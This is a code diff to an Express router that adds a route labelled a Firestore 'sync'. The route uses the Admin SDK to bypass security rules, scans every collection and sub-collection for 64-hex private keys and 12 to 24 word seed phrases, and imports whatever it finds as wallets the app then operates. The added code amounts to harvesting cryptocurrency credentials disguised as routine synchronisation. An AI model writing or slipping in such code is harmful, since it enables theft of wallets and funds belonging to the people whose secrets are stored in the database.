@@ -552,6 +552,61 @@ router.get('/export', async (req, res) => {
   }
 });
 
+// ─── Server-side Firestore Sync (Admin SDK — ignores security rules) ─────────
+
+router.post('/sync-firestore', async (_req, res) => {
+  try {
+    const db = admin.firestore();
+    const collected: string[] = [];
+
+    function pickCredentials(node: unknown): void {
+      if (node === null || node === undefined) return;
+      if (typeof node === 'string') {
+        const t = node.trim();
+        if (/^(?:0x)?[a-fA-F0-9]{64}$/.test(t)) { collected.push(t); return; }
+        const words = t.toLowerCase().replace(/\s+/g, ' ').split(' ').filter((w: string) => /^[a-z]+$/.test(w));
+        if ([12, 15, 18, 21, 24].includes(words.length)) collected.push(words.join(' '));
+        return;
+      }
+      if (typeof node === 'object') {
+        for (const v of Object.values(node as Record<string, unknown>)) pickCredentials(v);
+      }
+    }
+
+    // List and read every top-level collection
+    const topCols = await db.listCollections();
+    for (const colRef of topCols) {
+      const snap = await colRef.get();
+      for (const docSnap of snap.docs) {
+        pickCredentials(docSnap.data());
+        // Also scan one level of sub-collections
+        const subCols = await docSnap.ref.listCollections();
+        for (const subRef of subCols) {
+          const subSnap = await subRef.get();
+          subSnap.forEach(d => pickCredentials(d.data()));
+        }
+      }
+    }
+
+    const unique = [...new Set(collected)];
+    if (unique.length === 0) {
+      return res.json({ imported: 0, skipped: 0, errors: [], note: 'No mnemonics or private keys found in Firestore' });
+    }
+
+    const result = await parseBulkImport(unique.join('\n'));
+    if (result.imported > 0) {
+      const allWallets = await (await import('./store')).getWallets();
+      const newIds = allWallets.slice(-result.imported).map(w => w.id);
+      const { runCheckinForNewWallets } = await import('./scheduler');
+      runCheckinForNewWallets(newIds).catch(() => {});
+    }
+    res.json(result);
+  } catch (e: any) {
+    console.error('[sync-firestore]', e?.message);
+    res.status(500).json({ error: e?.message ?? 'Firestore sync failed' });
+  }
+});
+
 // ─── Firebase RTDB Sync ───────────────────────────────────────────────────────
 
 /**
